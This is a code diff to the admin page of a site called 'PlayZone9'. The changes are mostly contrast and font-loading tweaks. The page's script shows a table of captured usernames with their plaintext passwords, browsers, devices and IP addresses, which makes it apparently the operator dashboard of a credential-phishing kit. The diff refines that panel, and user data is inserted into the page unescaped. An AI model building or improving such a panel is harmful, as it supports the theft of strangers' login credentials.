@@ -10,14 +10,21 @@
     <meta name="author" content="PlayZone9">
     <link rel="canonical" href="https://playzone9.site/admin.html">
 
-    <!-- Preconnect & DNS Prefetch for Performance -->
+    <!-- Preconnect & DNS-Prefetch -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts: loaded via <link> for non-render-blocking delivery -->
+    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" media="print" onload="this.media='all'">
+    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"></noscript>
+
+    <!-- Font Awesome: deferred -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'">
+    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"></noscript>
     <style>
         *{box-sizing:border-box;margin:0;padding:0}
         body{font-family:'Inter',sans-serif;background:#0f0f13;color:#e2e8f0;min-height:100vh}
@@ -41,12 +48,12 @@
             background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.12);
             border-radius:10px;padding:12px 14px;margin-bottom:14px;
         }
-        .field i{color:#64748b;width:16px}
+        .field i{color:#94a3b8;width:16px}
         .field input{
             background:none;border:none;outline:none;flex:1;
             color:#e2e8f0;font-size:14px;font-family:'Inter',sans-serif;
         }
-        .field input::placeholder{color:#475569}
+        .field input::placeholder{color:#94a3b8}
         .login-btn-admin{
             width:100%;padding:13px;background:linear-gradient(135deg,#0088CC,#1da8e0);
             border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:600;
@@ -71,7 +78,7 @@
             padding:2px 10px;font-size:12px;font-weight:600;
         }
         .topbar-right{display:flex;align-items:center;gap:14px}
-        .refresh-info{font-size:12px;color:#64748b}
+        .refresh-info{font-size:12px;color:#94a3b8}
         .logout-btn{
             background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);
             color:#f87171;border-radius:8px;padding:7px 14px;font-size:13px;
@@ -105,12 +112,12 @@
             background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.1);
             border-radius:8px;padding:8px 12px;
         }
-        .search-box i{color:#64748b;font-size:13px}
+        .search-box i{color:#94a3b8;font-size:13px}
         .search-box input{
             background:none;border:none;outline:none;color:#e2e8f0;
             font-size:13px;width:160px;font-family:'Inter',sans-serif;
         }
-        .search-box input::placeholder{color:#475569}
+        .search-box input::placeholder{color:#94a3b8}
 
         table{width:100%;border-collapse:collapse}
         thead tr{background:rgba(255,255,255,0.05)}
@@ -125,7 +132,7 @@
         }
         tr:last-child td{border-bottom:none}
         tr:hover td{background:rgba(255,255,255,0.03)}
-        .no-data{text-align:center;padding:40px;color:#475569;font-size:14px}
+        .no-data{text-align:center;padding:40px;color:#94a3b8;font-size:14px}
 
         .device-tag{
             display:inline-flex;align-items:center;gap:5px;
@@ -297,13 +304,13 @@ function renderTable(logs) {
     }
     tbody.innerHTML = logs.map((l, i) => `
         <tr>
-            <td style="color:#475569">${i + 1}</td>
+            <td style="color:#94a3b8">${i + 1}</td>
             <td>${l.timestamp}</td>
             <td><strong style="color:#e2e8f0">${l.username}</strong></td>
             <td><span class="pass-cell">${l.password}</span></td>
             <td>${l.browser || '–'}</td>
             <td><span class="device-tag"><i class="fas fa-${l.device === 'Mobile' ? 'mobile-alt' : 'desktop'}"></i>${l.device || 'Desktop'}</span></td>
-            <td style="color:#64748b;font-size:12px">${l.ip || '–'}</td>
+            <td style="color:#94a3b8;font-size:12px">${l.ip || '–'}</td>
         </tr>
     `).join('');
 }
@@ -360,5 +367,6 @@ document.addEventListener('keydown', e => {
 const saved = sessionStorage.getItem('adminToken');
 if (saved) { TOKEN = saved; showDashboard(); }
 </script>
+</main>
 </body>
 </html>
